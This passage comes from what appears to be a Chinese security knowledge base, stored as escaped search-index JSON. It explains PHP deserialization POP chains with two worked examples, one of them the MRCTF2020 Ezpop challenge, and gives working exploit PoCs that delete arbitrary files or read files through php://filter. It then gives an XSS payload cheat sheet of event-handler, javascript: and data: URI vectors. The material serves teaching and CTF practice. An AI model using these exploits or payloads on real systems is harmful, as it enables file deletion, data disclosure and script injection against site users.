\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u63a8\u7406\u51fa\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\u7684test\u5bf9\u8c61\u5927\u81f4\u5982\u4e0b</p> <pre><code>&lt;?php   \n\nclass test{\n\n    var $id = 'phpinfo();';\n\n    function __wakeup(){\n        eval($this-&gt;id);\n    }\n\n}\n\n?&gt;\n</code></pre> <p>\u800c\u53cd\u5e8f\u5217\u5316\u4f1a\u65f6\u4f1a\u81ea\u52a8\u8c03\u7528__wakeup\u9b54\u672f\u65b9\u6cd5\uff0c\u5373\u6267\u884c<code>eval(phpinfo();)</code></p> <p></p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_7","title":"\u6f0f\u6d1e\u68c0\u6d4b\uff1a","text":"<p>\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u53d1\u73b0\u4e00\u822c\u9700\u5ba1\u8ba1\u6e90\u7801\uff0c\u5bfb\u627e\u53ef\u5229\u7528\u7684pop\u94fe</p> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u4e3a\u4e86\u8ba9\u5927\u5bb6\u7406\u89e3\uff0c\u8f83\u4e3a\u7b80\u5355\uff0c\u76f4\u63a5\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\u5c31\u6709\u53ef\u4ee5\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u81ea\u52a8\u8c03\u7528\u9b54\u672f\u65b9\u6cd5\u4ece\u800c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u800c\u5b9e\u9645\u4e2d\u57fa\u672c\u4e0d\u4f1a\u6709\u8fd9\u79cd\u8fd9\u4e48\u7b80\u5355\u7684\uff0c\u66f4\u591a\u7684\u5219\u662f\u9700\u8981\u901a\u8fc7\u5bfb\u627e\u76f8\u540c\u7684\u51fd\u6570\u540d\u5c06\u7c7b\u7684\u5c5e\u6027\u548c\u654f\u611f\u51fd\u6570\u7684\u5c5e\u6027\u8054\u7cfb\u8d77\u6765</p> <p>\u4e0b\u9762\u6211\u4eec\u5c31\u901a\u8fc7\u4e24\u9053\u7b80\u5355\u7684\u9898\u76ee\u6765\u5b66\u4e60\u6784\u9020\u7b80\u5355\u7684pop\u94fe\u6765\u5229\u7528\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#pop-chainpop","title":"POP CHAIN(POP\u94fe)\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_8","title":"\u6982\u5ff5\uff1a","text":"<p>\u901a\u8fc7\u7528\u6237\u53ef\u63a7\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u5176\u4e2d\u53ef\u89e6\u53d1\u7684\u9b54\u672f\u65b9\u6cd5\u4e3a\u51fa\u53d1\u70b9\uff0c\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\u7684\u51fd\u6570\u5728\u5176\u4ed6\u7c7b\u4e2d\u5b58\u5728\u540c\u540d\u51fd\u6570\uff0c\u6216\u901a\u8fc7\u4f20\u9012\uff0c\u5173\u8054\u7b49\u53ef\u4ee5\u8c03\u7528\u7684\u5176\u4ed6\u6267\u884c\u654f\u611f\u64cd\u4f5c\u7684\u51fd\u6570\uff0c\u7136\u540e\u4f20\u9012\u53c2\u6570\u6267\u884c\u654f\u611f\u64cd\u4f5c\uff0c\u5373</p> <p>\u7528\u6237\u53ef\u63a7\u53cd\u5e8f\u5217\u5316\u2192\u9b54\u672f\u65b9\u6cd5\u2192\u9b54\u672f\u65b9\u6cd5\u4e2d\u8c03\u7528\u7684\u5176\u4ed6\u51fd\u6570\u2192\u540c\u540d\u51fd\u6570\u6216\u901a\u8fc7\u4f20\u9012\u53ef\u8c03\u7528\u7684\u51fd\u6570\u2192\u654f\u611f\u64cd\u4f5c</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#1","title":"\u5b9e\u4f8b\u89e3\u67901\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_9","title":"\u6e90\u7801\uff1a","text":"<pre><code>&lt;?php\n\nclass Test1{\n    protected $obj;\n\n    function __construct(){\n\n        $this-&gt;obj = new Test3;\n\n    }\n\n    function __toString(){\n\n        if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;Delete();\n\n    }\n\n}\n\nclass Test2{  \n    public $cache_file;\n\n    function Delete(){\n        $file = \u201c/var/www/html/cache/tmp/{$this-&gt;cache_file}\u201d;\n\n        if (file_exists($file)){\n\n            @unlink($file);\n        }\n\n        return 'I am a evil Delete function';\n\n    }\n\n}\n\nclass Test3{\n\n    function Delete(){\n\n        return 'I am a safe Delete function';\n\n    }\n\n}\n\n$user_data = unserialize($_GET['data']);\n\necho $user_data;\n\n?&gt;\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_10","title":"\u4ee3\u7801\u5206\u6790\uff1a","text":"<p>\u9996\u5148\u6211\u4eec\u770b\u6700\u9650\u5236\u884c\u7684\u64cd\u4f5c\u5728\u6700\u4e0b\u9762\u53cd\u5e8f\u5217\u5316GET\u5230\u7684\u53c2\u6570data\uff0c\u7136\u540e\u6267\u884cecho \\(user_data\uff0c\u8fd9\u91cc\u5982\u679c\\)user_data\u662f\u4e00\u4e2a\u7c7b\u5b9e\u4f8b\u5316\u6765\u7684\u5bf9\u8c61\u7684\u8bdd\uff0c\u5c31\u4f1a\u89e6\u53d1\u5bf9\u8c61\u4e2d\u7684__tostring()\u9b54\u672f\u65b9\u6cd5</p> <p>\u5176\u6b21\u6e90\u7801\u4e2d\u6709\u4e09\u4e2a\u7c7b\uff0c\u5206\u522b\u662fTest1\uff0cTest2\uff0cTest3\uff0c\u4f9d\u6b21\u5206\u6790</p> <p>Test1\uff1a</p> <pre><code>class Test1{\n    protected $obj;\n\n    function __construct(){\n\n        $this-&gt;obj = new Test3;\n\n    }\n\n    function __toString(){\n\n        if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;Delete();\n\n    }\n\n}\n</code></pre> <p>1.\u9996\u5148\u58f0\u660e\u4e86$obj\u53d8\u91cf</p> <p>2.\u7c7b\u4e2d\u6709__construct()\u548c__tostring()\u9b54\u672f\u65b9\u6cd5\uff0c__construct()\u65b9\u6cd5\u4e3a\\(obj\u53d8\u91cf\u8d4b\u503c\u4e3aTest3\u7c7b\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\\_\\_tostring()\u65b9\u6cd5\u5224\u65ad\u5982\u679c\\)obj\u53d8\u91cf\u5b58\u5728\u5219\u8fd4\u56de\u8c03\u7528$obj\u5bf9\u8c61\u4e2d\u7684Delete()\u51fd\u6570</p> <p>Test2\uff1a</p> <pre><code>class Test2{  \n    public $cache_file;\n\n    function Delete(){\n        $file = \u201c/var/www/html/cache/tmp/{$this-&gt;cache_file}\u201d;\n\n        if (file_exists($file)){\n\n            @unlink($file);\n        }\n\n        return 'I am a evil Delete function';\n\n    }\n\n}\n</code></pre> <p>1.\u9996\u5148\u58f0\u660e\u4e86$cache_file\u53d8\u91cf</p> <p>2.\u5b9a\u4e49\u4e86Delete()\u51fd\u6570\uff0c\u5982\u679c\u5b9a\u4e49\u7684$file\u53d8\u91cf\u4e2d\u7684\u6587\u4ef6\u5b58\u5728\uff0c\u5219\u5220\u9664\u6b64\u6587\u4ef6\u5e76\u8fd4\u56de\u63d0\u793a\u5185\u5bb9</p> <p>Test3\uff1a</p> <pre><code>class Test3{\n\n    function Delete(){\n\n        return 'I am a safe Delete function';\n\n    }\n\n}\n</code></pre> <p>1.\u5b9a\u4e49\u4e86Delete()\u51fd\u6570,\u6b64\u51fd\u6570\u53ea\u8fd4\u56de\u4e00\u53e5\u8bdd\uff0c\u6ca1\u6709\u654f\u611f\u64cd\u4f5c\uff0c\u4e3a\u5b89\u5168\u51fd\u6570</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#pop","title":"POP\u94fe\u6784\u9020\uff1a","text":"<p>\u9996\u5148\u51fa\u53d1\u70b9\u662fTest1\u4e2d\u7684__tostring()\u9b54\u672f\u65b9\u6cd5\uff0c\u5176\u4e2d\u8c03\u7528\u4e86\\(this-&gt;obj\u4e2d\u7684Delete()\u51fd\u6570\uff0c\u800c\\)this-&gt;obj\u662f\u5728\u5b9e\u4f8b\u5316\u5bf9\u8c61\u662f\u89e6\u53d1__construct\u65b9\u6cd5\uff0c\u5c06$this-&gt;obj\u4f5c\u4e3a\u5b9e\u4f8b\u5316Test3\u7c7b\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u6b64\u65f6\u8c03\u7528\u7684\u5c31\u662fTest3\u7c7b\u4e2d\u7684Delete()\u51fd\u6570\uff0c\u53ea\u8fd4\u56de\u4e00\u53e5\u63d0\u793a\uff0c\u90a3\u4e48\u6b64\u65f6\u7684\u6267\u884c\u6d41\u5982\u4e0b</p> <p>Test1\u7c7b\u2192__construct()\u2192$this-&gt;obj=new Test3\u2192__tostring()\u2192Test3.Delete\u65b9\u6cd5</p> <p>\u4e0d\u8fc7\u5728Test2\u7c7b\u4e2d\u4e5f\u5b9a\u4e49\u4e86\u548cTest3\u4e2d\u540c\u540d\u7684\u51fd\u6570Delete()\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u7684\u53cd\u5e8f\u5217\u5316\u53c2\u6570\u6765\u4fee\u6539\u6267\u884c\u6d41\uff0c\u4e5f\u5c31\u662f\u6784\u9020\u6211\u4eec\u7684POP\u94fe\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u540e\u4f7f\u7528Test2\u7c7b\u4e2d\u7684Delete()\u6765\u6267\u884c\u654f\u611f\u64cd\u4f5c\uff0c\u8ba9\u6267\u884c\u6d41\u5982\u4e0b</p> <p>Test1\u7c7b\u2192__construct()\u2192$this-&gt;obj=new Test2\u2192__tostring()\u2192Test2.Delete\u65b9\u6cd5</p> <p>\u90a3\u4e48POP\u94fe\u7684\u6784\u9020\u5c31\u662f\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u548cecho\u6765\u89e6\u53d1__tostring()\u9b54\u672f\u65b9\u6cd5\uff0c\u5e76\u4e14\u6b64\u65b9\u6cd5\u4e2d\u8c03\u7528Test2\u4e2d\u7684Delete()\u65b9\u6cd5\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u5371\u5bb3\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#poc","title":"\u5229\u7528POC\uff1a","text":"<pre><code>&lt;?php\nclass Test1{\n    protected $obj;\n    function __construct(){\n        $this-&gt;obj = new Test2;\n    }\n}\n\nclass Test2{\n    public $cache_file = '../../../../test.php';\n}\n\n$evil = new Test1();\n\necho urlencode(serialize($evil));\n\n?&gt;\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#2","title":"\u5b9e\u4f8b\u89e3\u67902\uff1a","text":"<p>[MRCTF2020]Ezpop</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_11","title":"\u6e90\u7801\uff1a","text":"<pre><code>Welcome to index.php\n&lt;?php\n//flag is in flag.php\nclass Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this-&gt;append($this-&gt;var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this-&gt;source = $file;\n        echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";\n    }\n    public function __toString(){\n        return $this-&gt;str-&gt;source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\n            echo \"hacker\";\n            $this-&gt;source = \"index.php\";\n        }\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this-&gt;p = array();\n    }\n\n    public function __get($key){\n        $function = $this-&gt;p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_12","title":"\u4ee3\u7801\u5206\u6790\uff1a","text":"<p>\u9996\u5148\u8fd8\u662f\u770b\u5168\u90e8\u4ee3\u7801\u7684\u5165\u70b9\uff0c\u5728\u6700\u4e0b\u9762\u7684\u4e00\u4e2a\u5224\u65ad\uff0cGET\u63a5\u6536\u5230pop\u53c2\u6570\u5219\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u5426\u5219\u5b9e\u4f8b\u5316Show\u7ed9$a\uff0c\u7136\u540e\u9ad8\u4eae\u5f53\u524d\u6587\u4ef6</p> <p>\u5176\u6b21\u6e90\u7801\u4e2d\u6709\u4e09\u4e2a\u7c7b\uff0c\u5206\u522b\u662fModifier\uff0cShow\uff0cTest\uff0c\u4f9d\u6b21\u5206\u6790</p> <p>Modifier\uff1a</p> <pre><code>class Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this-&gt;append($this-&gt;var);\n    }\n}\n</code></pre> <p>1.\u9996\u5148\u58f0\u660e\u4e86$var\u53d8\u91cf</p> <p>2.\u5b9a\u4e49\u4e86append(\\(value)\u65b9\u6cd5\uff0c\u64cd\u4f5c\u662finclude(\\)value)</p> <p>3.\u5b9a\u4e49\u4e86\u9b54\u672f\u65b9\u6cd5__invoke()\uff0c\u64cd\u4f5c\u662f\u8c03\u7528\u672c\u7c7b\u4e2d\u7684append\u65b9\u6cd5\u4f20\u9012\u53c2\u6570\u4e3a$this-&gt;var</p> <p>__invoke() \u5f53\u5c1d\u8bd5\u4ee5\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\u89e6\u53d1</p> <p>Show\uff1a</p> <pre><code>class Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this-&gt;source = $file;\n        echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";\n    }\n    public function __toString(){\n        return $this-&gt;str-&gt;source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\n            echo \"hacker\";\n            $this-&gt;source = \"index.php\";\n        }\n    }\n}\n</code></pre> <p>1.\u58f0\u660e\u4e86\\(source\u548c\\)str\u53d8\u91cf</p> <p>2.\u58f0\u660e\u4e86\u9b54\u672f\u65b9\u6cd5__construct(\\(file='index.php')\uff0c\u64cd\u4f5c\u4e3a\u7ed9\\)this-&gt;source\u53d8\u91cf\u8d4b\u503c\u4e3a$file</p> <p>__construct() \u5f53\u521b\u5efa\u5bf9\u8c61\u65f6\u89e6\u53d1\uff0c\u4e00\u822c\u7528\u4e8e\u521d\u59cb\u5316\u5bf9\u8c61\uff0c\u5bf9\u53d8\u91cf\u8d4b\u521d\u503c</p> <p>3.\u58f0\u660e\u4e86\u9b54\u672f\u65b9\u6cd5__toString()\uff0c\u64cd\u4f5c\u4e3a\u8fd4\u56de$this-&gt;str-&gt;source</p> <p>__toString() \u5f53\u4e00\u4e2a\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1</p> <p>4.\u58f0\u660e\u4e86\u9b54\u672f\u65b9\u6cd5__wakeup()\uff0c\u64cd\u4f5c\u4e3a\u6b63\u5219\u5339\u914d\\(this-&gt;source\u53d8\u91cf\uff0c\u5982\u679c\u5339\u914d\u5230\u5219\u8d4b\u503c\\)this-&gt;source=\"index.php\"</p> <p>__wakeup() \u4f7f\u7528unserialize()\u65f6\u81ea\u52a8\u89e6\u53d1</p> <p>Test\uff1a</p> <pre><code>class Test{\n    public $p;\n    public function __construct(){\n        $this-&gt;p = array();\n    }\n\n    public function __get($key){\n        $function = $this-&gt;p;\n        return $function();\n    }\n}\n</code></pre> <p>1.\u58f0\u660e\u4e86$p\u53d8\u91cf</p> <p>2.\u58f0\u660e\u4e86\u9b54\u672f\u65b9\u6cd5__construct()\uff0c\u64cd\u4f5c\u4e3a\u8d4b\u503c$this-&gt;p=array()</p> <p>3.\u58f0\u660e\u4e86\u9b54\u672f\u65b9\u6cd5__get()\uff0c\u64cd\u4f5c\u4e3a\u8d4b\u503c\\(function=\\)this-&gt;p\uff0c\u7136\u540e\u4ee5\u51fd\u6570\u8fd4\u56de$funcion()</p> <p>__get() \u7528\u4e8e\u4ece\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#pop_1","title":"POP\u94fe\u6784\u9020\uff1a","text":"<p>\u7531\u4e8e\u672c\u9898\u662f\u4e00\u9053CTF\u9898\u76ee\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u83b7\u5f97flag\uff0c\u63d0\u793aflag\u5728flag.php\u91cc\uff0c\u901a\u8fc7\u5bf9\u4e09\u4e2a\u7c7b\u7684\u4ee3\u7801\u5206\u6790\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5230flag\u7684\u5730\u65b9\u53ea\u6709append(\\(value)\u65b9\u6cd5\uff0c\u64cd\u4f5c\u662finclude(\\)value)\uff0c\u53ef\u4ee5\u5229\u7528\u4f2a\u534f\u8bae\u6765\u8bfb\u53d6flag.php\u5185\u5bb9\u3002</p> <p>\u7531\u4e8e\u8fd9\u9053\u9898\u76ee\u53ea\u6709include\u90a3\u91cc\u53ef\u4ee5\u5229\u7528\uff0c\u90a3\u4e48\u6211\u4eec\u4ece\u90a3\u91cc\u53cd\u63a8</p> <p>\u4e00.\u8981\u60f3\u5229\u7528include\uff0c\u9700\u8981\u4f7f\u7528__invoke()\u6765\u89e6\u53d1\uff0c\u800c\u8fd9\u4e2a\u9b54\u672f\u65b9\u6cd5\u7684\u89e6\u53d1\u6761\u4ef6\u662f\uff0c\u4ee5\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u6211\u4eec\u627e\u54ea\u91cc\u53ef\u4ee5\u6ee1\u8db3\u8fd9\u4e2a\u6761\u4ef6\u3002</p> <p>\u4e8c.\u5728\u5bf9Test\u7c7b\u4ee3\u7801\u5206\u6790\u7684\u7b2c\u4e09\u6761\u4e2d\uff0c__get()\u9b54\u672f\u65b9\u6cd5\u4ee5\\(funcion()\u51fd\u6570\u8fd4\u56de\\)this-&gt;p\uff0c**\u6211\u4eec\u9700\u8981\u5c06\\(this-&gt;p\u8bbe\u7f6e\u4e3aModifier\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61**\uff0c\u90a3\u4e48\u800c\u4e14\u4e0a\u9762\u5bf9\\)this-&gt;p\u8d4b\u503c\u7684\u64cd\u4f5c\u662f__construct()\u63a7\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u90a3\u4e48\u5c31\u770b\u5982\u4f55\u5229\u7528__get()</p> <p>\u4e09.\u8981\u60f3\u5229\u7528Test\u7c7b\u4e2d\u7684__get()\u9b54\u672f\u65b9\u6cd5\uff0c\u4e5f\u9700\u8981\u6211\u4eec\u7528\u4e00\u5b9a\u7684\u6761\u4ef6\u89e6\u53d1\uff0c\u4ece\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u65f6\u89e6\u53d1\uff0c\u90a3\u4e48\u7b26\u5408\u7684\u53ea\u6709Show\u7c7b\u4e2d\u7684__toString()\uff0c\u9700\u8981\u5c06$this-&gt;str\u8bbe\u7f6e\u4e3aTest\u7c7b\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61</p> <p>\u56db.\u89e6\u53d1__toString()\u7684\u6761\u4ef6\u662f\uff1a__toString() \u5f53\u4e00\u4e2a\u7c7b\u88ab\u5f53\u6210\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1\uff0c\u90a3\u4e48\u5728\u672c\u7c7b\u4e2d\u7684__wakeup()\u9b54\u672f\u65b9\u6cd5\u4e2d\u7684preg_match\u5c31\u6b63\u597d\u53ef\u4ee5\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f**\u5c06\\(this-&gt;source\u8bbe\u7f6e\u4e3aShow\u7c7b\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u4e5f\u5c31\u9700\u8981\u5728\\_\\_construct()\u65f6\u5c31\u8bbe\u7f6e\\)file\u4e3aShow\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61**</p> <p>\u90a3\u4e48\u6574\u4f53\u7684pop\u94fe\u5e94\u8be5\u662f\u5982\u4e0b\u7684</p> <pre><code>Modifier::__invoke()&lt;--Test::__get()&lt;--Show::__toString()&lt;--Show::__wakeup()&lt;--Show::__construct()\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#poc_1","title":"\u5229\u7528POC\uff1a","text":"<pre><code>&lt;?php\nclass Modifier {\n    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php' ;\n\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file){\n    $this-&gt;source = $file;\n    }\n}\n\nclass Test{\n    public $p;\n}\n\n$a = new Show();\n$a-&gt;str = new Test();\n$a-&gt;str-&gt;p = new Modifier();\n$b = new Show($a);\necho urlencode(serialize($b));\n?&gt;\n</code></pre> <p>\u8fd9\u9053\u9898\u76ee\u4e0d\u662f\u5229\u7528\u7684\u540c\u540d\u51fd\u6570\u6765\u6267\u884c\u654f\u611f\u64cd\u4f5c\uff0c\u800c\u662f\u5229\u7528\u51fd\u6570\u548c\u5bf9\u8c61\u4e4b\u95f4\u7684\u4f20\u9012\u6765\u8c03\u7528\u654f\u611f\u51fd\u6570\uff0c\u5f62\u6210\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53ef\u4ee5\u4efb\u610f\u8c03\u7528\u6587\u4ef6\u5305\u542b\u51fd\u6570\u3002</p> <p>\u76f8\u4fe1\u5927\u5bb6\u901a\u8fc7\u4e0a\u9762\u7684\u4e24\u4e2a\u4f8b\u5b50\u7684\u5b66\u4e60\u5df2\u7ecf\u5bf9\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6709\u4e86\u57fa\u672c\u7684\u7406\u89e3~</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%20payload%E9%80%9F%E6%9F%A5%E8%A1%A8/","title":"XSS payload\u901f\u67e5\u8868","text":"<pre><code>      \u5341\u8fdb\u5236\u503c                         URL\u7f16\u7801                            \u4ecb\u7ecd            \n        47                              %2F                             \u6b63\u659c\u6760            \n        13                              %0D                             \u56de\u8f66            \n        12                              %0C                             \u5206\u9875\u7b26            \n        10                              %0A                             \u6362\u884c            \n        9                               %09                             \u6c34\u5e73\u5236\u8868\u7b26\n</code></pre> <pre><code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=\"&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;\n&lt;svg&gt;&lt;p&gt;&lt;style&gt;&lt;a id=\"&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;\"&gt;&lt;/p&gt;&lt;/svg&gt;\n</code></pre> <pre><code>&lt;svg/\u03bfnl\u03bfad=alert(1)&gt; \n</code></pre> <pre><code>&lt;svg\n\nonload=alert(1)&gt;&lt;svg&gt; # newline char\n\n&lt;svg    onload=alert(1)&gt;&lt;svg&gt; # tab char\n\n&lt;svg \u03bfnl\u03bfad=alert(1)&gt;   # new page char (0xc) \n</code></pre> <pre><code>&lt;img src=x onerror=alert()&gt;\n\n&lt;svg onload=alert()&gt;\n\n&lt;body onpageshow=alert(1)&gt;\n\n&lt;div style=\"width:1000px;height:1000px\" onmouseover=alert()&gt;&lt;/div&gt;\n\n&lt;marquee width=10 loop=2 behavior=\"alternate\" onbounce=alert()&gt; (firefox only)\n\n&lt;marquee onstart=alert(1)&gt; (firefox only)\n\n&lt;marquee loop=1 width=0 onfinish=alert(1)&gt; (firefox only)\n\n&lt;input autofocus=\"\" onfocus=alert(1)&gt;&lt;/input&gt;\n\n&lt;details open ontoggle=\"alert()\"&gt;  (chrome &amp; opera only)\n</code></pre> <pre><code>\u4e8b\u4ef6\u540d\u79f0 \u6807\u7b7e \u5907\u6ce8\nonplay video, audio \u9002\u7528\u4e8e0-click\uff1a\u7ed3\u5408HTML\u7684autoplay\u5c5e\u6027\u4ee5\u53ca\u7ed3\u5408\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\nonplaying video, audio \u9002\u7528\u4e8e0-click: \u7ed3\u5408HTML\u7684autoplay\u5c5e\u6027\u4ee5\u53ca\u7ed3\u5408\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\noncanplay video, audio \u5fc5\u987b\u94fe\u63a5\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\nonloadeddata video, audio \u5fc5\u987b\u94fe\u63a5\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\nonloadedmetadata video, audio \u5fc5\u987b\u94fe\u63a5\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\nonprogress video, audio \u5fc5\u987b\u94fe\u63a5\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\nonloadstart video, audio \u6f5c\u5728\u76840-click\u5411\u91cf\noncanplay video, audio \u5fc5\u987b\u94fe\u63a5\u6709\u6548\u7684\u89c6\u9891/\u97f3\u9891\n</code></pre> <pre><code>&lt;video autoplay controls onplay=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/video&gt;\n\n&lt;video controls onloadeddata=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/video&gt;\n\n&lt;video controls onloadedmetadata=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/video&gt;\n\n&lt;video controls onloadstart=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/video&gt;\n\n&lt;video controls onloadstart=\"alert()\"&gt;&lt;source src=x&gt;&lt;/video&gt;\n\n&lt;video controls oncanplay=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/video&gt;\n\n&lt;audio autoplay controls onplay=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/audio&gt;\n\n&lt;audio autoplay controls onplaying=\"alert()\"&gt;&lt;source src=\"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4\"&gt;&lt;/audio&gt;\n</code></pre> <pre><code>&lt;object data=\"data:text/html,&lt;script&gt;alert(5)&lt;/script&gt;\"&gt;\n\n&lt;iframe srcdoc=\"&lt;svg onload=alert(4);&gt;\"&gt;\n\n&lt;object data=javascript:alert(3)&gt;\n\n&lt;iframe src=javascript:alert(2)&gt;\n\n&lt;embed src=javascript:alert(1)&gt;\n\n&lt;embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/embed&gt;\n\n&lt;embed src=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczL**yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"&gt;&lt;/embed&gt;\n</code></pre> <pre><code>            